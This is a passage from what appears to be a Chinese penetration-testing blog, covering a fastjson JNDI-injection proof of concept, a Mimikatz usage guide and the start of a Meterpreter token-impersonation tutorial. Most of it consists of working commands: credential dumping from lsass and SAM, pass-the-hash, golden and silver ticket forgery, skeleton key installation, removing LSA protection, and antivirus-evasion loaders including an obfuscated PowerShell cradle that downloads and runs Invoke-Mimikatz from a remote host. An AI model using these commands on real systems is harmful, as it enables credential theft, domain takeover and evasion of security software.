<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI_Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        String json = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/1vehsr\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>使用JNDIEXPLOIT工具开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java   -jar   JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar     -A 127.0.0.1     -C &quot;calc&quot;</span><br><span class="line"></span><br><span class="line"> -A     指定监听地址</span><br><span class="line"> -C     执行的命令</span><br></pre></td></tr></table></figure>

<p>可以看到命令成功执行</p>
<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211110110216214.png" alt="image-20211110110216214"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/" rel="tag">-web漏洞 -框架漏洞 -组件漏洞</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Mimikatz运行姿势"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/" class="article-date">
  <time datetime="2021-11-03T12:56:59.338Z" itemprop="datePublished">2021-11-03</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" alt="image-20211103103351984"></p>
<p>使用sekurlsa模块抓取明文密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" alt="image-20211103103420451"></p>
<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
<p>修改命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" alt="image-20211103105046333"></p>
<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" alt="image-20211103110249663"></p>
<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对/相对路径)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" alt="image-20211103110638898"></p>
<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" alt="image-20211103111347692"></p>
<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" alt="image-20211103113844380"></p>
<p>可看到passwords.txt文档中系统的明文密码信息</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" alt="image-20211103115851943"></p>
<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
<p>命令；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>

<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" alt="image-20211103130911394"></p>
<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>



<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
<p>首先获取krbtft用户的NTLM哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>



<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>



<p>导出上面生成的票据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>



<p>查看导入后获取的域管权限，查看主机的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>



<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
<p>提升权限，获取主机账号的哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" alt="image-20211103161547663"></p>
<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" alt="image-20211103162043108"></p>
<p>生成白银票据命令 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>



<p>如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" alt="image-20211103162850526"></p>
<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
<p>伪造白银票据后，我们就可以远程访问DC</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" alt="image-20211103163128580"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>



<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
<p>在域控上安装skeleton key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" alt="image-20211103171351475"></p>
<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>



<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" alt="image-20211103172059633"></p>
<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>

<p>运行mimikazt模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" alt="image-20211103194723187"></p>
<p>在cmd中运行过程中没有被拦截</p>
<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" alt="image-20211103200143717"></p>
<p>稍微做了简单的混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>

<p>还是被拦截</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" alt="image-20211103200627835"></p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" alt="image-20211103200702681"></p>
<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
<p>并放在对应的系统版本的Framework目录中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>



<p>然后在powershell中执行命令生成key.snk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" alt="image-20211103202206247"></p>
<p>最后生成mimikatz，在运行mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在运行时被360发现啦，火绒没有反应</p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" alt="image-20211103202433218"></p>
<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" alt="image-20211103203026847"></p>
<p>360和火绒都没有报毒和进行拦截</p>
<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a target="_blank" rel="noopener" href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" alt="image-20211103204511543"></p>
<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" alt="image-20211103204537821"></p>
<p>360拦截了，火绒没绕过</p>
<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" alt="image-20211103204250467"></p>
<p>360和火绒都没有拦截</p>
<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-windows令牌假冒"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/" class="article-date">
  <time datetime="2021-11-01T10:06:31.518Z" itemprop="datePublished">2021-11-01</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="windows令牌假冒"><a href="#windows令牌假冒" class="headerlink" title="windows令牌假冒"></a>windows令牌假冒</h1><hr>
<h2 id="访问令牌"><a href="#访问令牌" class="headerlink" title="访问令牌"></a>访问令牌</h2><hr>
<p><strong>访问令牌</strong>（Access Token）是Windows操作系统用于描述进程或线程安全上下文的一种对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝。</p>
<p>系统使用访问令牌来辨识拥有进程的用户，以及线程试图执行系统任务时是否具有所需的特权.与进程相关联，进程创建时根据LoginSession分配对应的TOKEN，含有与该进程用户账号、组信息、权限信息等。Token每次在用户登录时根据LoginSession分配，访问资源时提交Token进行身份验证。</p>
<p><strong>令牌分类</strong></p>
<ul>
<li>访问令牌(Access Token): 表示访问控制操作主体的系统对象</li>
<li>会话令牌(Session Token): 交互会话中唯一的身份标识符</li>
<li>密保令牌(Security Token): 又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</li>
</ul>
<p>windows系统下的令牌有两种表现形式:</p>
<p>1.Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)<br>2.Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p>
<p>两种令牌都是在重启后才会消除，具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p>
<h2 id="令牌窃取-假冒"><a href="#令牌窃取-假冒" class="headerlink" title="令牌窃取/假冒"></a>令牌窃取/假冒</h2><hr>
<p>这里使用msf的模块对系统中从令牌进行窃取，并对获取到的令牌进行利用</p>
<h3 id="incognito模块"><a href="#incognito模块" class="headerlink" title="incognito模块"></a>incognito模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load incognito 加载模块</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210024276.png" alt="image-20211021210024276"></p>
<p>相关参数命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list_tokens               列举token，-u参数列举用户，-g参数列举用户组</span><br><span class="line">impersonate_token [token] 令牌假冒登录用户</span><br></pre></td></tr></table></figure>



<p>列举所有用户令牌</p>
<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210254864.png" alt="image-20211021210254864"></p>
<p>列举所有用户组令牌</p>
<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021210343650.png" alt="image-20211021210343650"></p>
<p>此时的权限为SYSTEM权限</p>
<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211343377.png" alt="image-20211021211343377"></p>
<p>假冒NETWORK SERVICE的令牌，这里的\有两个，前面的符号是转义符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impressonate_token ndsec-PC\\ndsec</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211257111.png" alt="image-20211021211257111"></p>
<p>令牌已经被修改</p>
<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021211407856.png" alt="image-20211021211407856"></p>
<h3 id="steal-token盗取进程令牌"><a href="#steal-token盗取进程令牌" class="headerlink" title="steal_token盗取进程令牌"></a>steal_token盗取进程令牌</h3><hr>
<p>使用steal_token命令盗用进程的令牌</p>
<p>列出当前状态下服务器的运行的进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure>

